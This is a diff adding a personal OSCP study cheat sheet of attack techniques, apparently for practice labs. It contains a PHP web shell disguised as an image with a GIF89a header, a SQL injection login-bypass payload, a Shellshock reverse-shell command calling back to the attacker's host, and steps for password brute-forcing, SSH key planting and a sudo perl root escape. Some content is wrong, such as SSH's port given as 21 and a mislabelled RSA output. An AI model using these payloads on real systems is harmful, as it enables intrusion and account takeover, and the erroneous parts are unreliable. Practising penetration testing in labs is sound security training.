@@ -1,0 +1,229 @@
+OSCP Cheat Sheet
+This is just a simple cheat sheet for personal use.
+
+WPScan / Password attacks
+Wpscan --url http://example.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin, eric
+https://wpwhitesecurity.com/strong-wordpress-passwords-wpscan/ 
+
+
+LFI/RFI (Local/Remote File Inclusion)
+https://hackingarticles.in/beginner-guide--file-inclusion-attack-lfirfi
+Related but just shells that can be used: https://github.com/backdoorhub/shell-backdoor-list 
+
+
+Fully Interactive Shell (Post Exploitation)
+When obtaining a reverse shell with a Netcat listener, it is by default non-interactive and you cannot pass keyboard shortcuts or special characters such as tab.
+It is quite simple to work around. For starters, in your shell, run python -c 'import pty;pty.spawn("/bin/bash");' to obtain a partially interactive bash shell.
+After that, do CTRL+Z to background Netcat. Enter stty raw -echo in your terminal, which will tell your terminal to pass keyboard shortcuts etc. through. Once that is done, run the command fg to bring Netcat back to the foreground. Note you will not be able to see what you are typing in terminal after you change your stty setting. You should now have tab autocomplete as well as be able to use interactive commands such as su and nano.
+If you want to see it in action, check out ippsec's YouTube videos, as he uses this exact method in quite a few of them: ippsec's channel
+
+That's a great thing to share, so here are my two cents:
+Spawning bash with python:
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+Background'ing the remote shell with CTRL-Z:
+user@remote:~$ ^Z
+
+Getting ROWS and COLS within current terminal window:
+user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
+
+Ignoring hotkeys in the local shell and getting back to the remote:
+user@local:~$ stty raw -echo; fg
+
+Setting correct size for the remote shell (where ROWS and COLS are the values from the 3rd bullet):
+user@remote:~$ stty rows ROWS cols COLS
+
+Adding some colors:
+user@remote:~$ export TERM=xterm-256color
+
+Reloading bash to apply the TERM variable:
+user@remote:~$ exec /bin/bash
+
+Hacking with SSH
+Remember that you can take your id_rsa file.pub file and put it on a host machine and then use this to SSH onto the machine without the need of a password, so long as you can paste your id_rsa.pub file into the id_rsa file or key file of a legit user on the system. 
+
+Other useful ssh commands:
+
+To generate a new key pair on your system: ssh-keygen -t rsa -C root@kali
+To ssh to the victim machine, but pass the id_rsa file instead of the password: 
+ssh -i id_rsa sysadmin@10.10.10.181
+
+Also note that the Message Of The Day file (update-motd.d/00-header) can be used to make calls to the system, and if this file executes as root, you can use it to echo out proof.txt files. 
+
+If you want to connect to SSH on a different port from the usual tcp 21, use: 
+ssh user@192.168.1.1 -p 26
+
+Remember! All id_rsa key files must be chmod 600
+
+If you have the P, Q and E values of RSA, you can use the following code to perform decryption:
+def egcd(a, b):
+    x,y, u,v = 0,1, 1,0
+    while a != 0:
+        q, r = b//a, b%a
+        m, n = x-u*q, y-v*q
+        b,a, x,y, u,v = a,r, u,v, m,n
+        gcd = b
+    return gcd, x, y
+
+def main():
+
+    p = 1090660992520643446103273789680343
+    q = 1162435056374824133712043309728653
+    e = 65537
+    ct = 299604539773691895576847697095098784338054746292313044353582078965
+
+    # compute n
+    n = p * q
+
+    # Compute phi(n)
+    phi = (p - 1) * (q - 1)
+
+    # Compute modular inverse of e
+    gcd, a, b = egcd(e, phi)
+    d = a
+
+    print( "n:  " + str(d) );
+
+    # Decrypt ciphertext
+    pt = pow(ct, d, n)
+    print( "pt: " + str(pt) )
+
+if __name__ == "__main__":
+    main()
+
+Check out the following:
+
+Python 2.7.18 (default, Apr 20 2020, 20:30:41)
+[GCC 9.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
+>>> str(hex(pt))
+'0x3665666331613564626238393034373531636536353636613330356262386566L'
+>>> str(hex(pt)[2:-1])
+'3665666331613564626238393034373531636536353636613330356262386566'
+>>> str(hex(pt)[2:-1]).decode('hex')
+'6efc1a5dbb8904751ce6566a305bb8ef'
+
+https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e 
+
+Using ssh2john to get passphrase for use with id_rsa key:
+Python ssh2john.py id_rsa > id_rsa.hash
+John id_rsa.hash -wordlist=rockyou.txt
+
+Hacking with FTP
+Here is one approach:
+$ ftp -n <<EOF
+open ftp.example.com
+user user secret
+put my-local-file.txt
+EOF
+
+
+Alternatively, create (or edit) the ~/.netrc file in the home dir of the user that will run the ftp command, give it appropriate perms (chmod 0600 ~/.netrc), and add the following:
+# ~/.netrc
+machine ftp.example.com
+login user
+password secret
+
+Then omit the login information, as in:
+$ echo put my-local-file.txt | ftp ftp.example.com
+
+
+Also, here's how you might do the same thing using curl:
+$ curl -T my-local-file.txt ftp://ftp.example.com --user user:secret
+
+
+SQLi for login pages
+Try opening Burp and catching the POST login request, modify the payload to username admin' or 1=1--+ and password admin' or 1=1--+
+
+Bypass File Upload Filtering
+Using exiftool to insert PHP code into a jpg, png, jpeg file to bypass file uploading can be seen here: https://github.com/ccodingsKILLS/php-cmd-exec-webshell 
+
+Research docs on this topic: http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf 
+http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html 
+
+One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.
+We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.
+php phtml, .php, .php3, .php4, .php5, and .inc
+asp asp, .aspx
+perl .pl, .pm, .cgi, .lib
+jsp .jsp, .jspx, .jsw, .jsv, and .jspf
+Coldfusion .cfm, .cfml, .cfc, .dbm
+GIF89a;
+If they check the content. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:
+
+GIF89a;
+<?
+system($_GET['cmd']);//or you can insert your complete shell code
+?>
+
+Shellshock and cgi-bin Directory
+
+When doing a dirbuster scan or a similar URL discovery scan, if you see limited results, and /cgi-bin/ is showing (even a 403 response), then it is safe to assume we have some sort of shellshock vulnerability. The entry method will be through a script in ​ /cgi-bin/ ​ using the Shellshock exploit. Fuzz for the extensions cgi​, sh​, pl​, py
+
+You can use the exploit here: https://www.exploit-db.com/exploits/34900 
+
+To find hidden pages use dirb http://<IP>/cgi-bin/
+The proper usage of this would be something like: ​python shellshock.py payload=reverse rhost=10.10.10.56 lhost=<LAB IP> lport=<port> pages=/cgi-bin/user.sh
+
+Prerequisites
+“Standard” apache install
+apache user having /sbin/nologin as his shell (not required, but considered best practice and you would think it might help mitigate the problem…)
+CGI scripts enabled
+Simple bash CGI script that echoes some text back looking like an HTML response
+You can find simple bash CGI scripts if you do a Google search. Example here : CGI getting started site (It was the first decent Google result but there are many others)
+Read: https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/ 
+
+
+Lists
+Seclists 
+PayloadALlTheThings
+Gobuster
+https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/ 
+
+John
+
+
+
+Privesc
+When in privsec there are some things to watch out for:
+Perl
+If you can use perl as root without the need for sudo, just run: 
+​sudo /usr/bin/perl -e 'exec "/bin/sh"' 
+it would be obvious that you could do this if linenum showed something like: 
+User shelly may run the following commands on Shocker:
+	(root) NOPASSWD: /usr/bin/perl
+
+[00;33m[+] Possible sudo pwnage![00m
+/usr/bin/perl
+
+
+
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ a good demo of this is here for the Magic HTB box https://ca0y1h.top/Target_drone/HackTheBox/15.HTB-Magic-walkthrough/ 
+
+https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Appendix
+http://rumkin.com/tools/cipher/vigenere.php - site for cyper tools (crypto)
+https://xapax.gitbooks.io/security/content/bypass_image_upload.html (book)
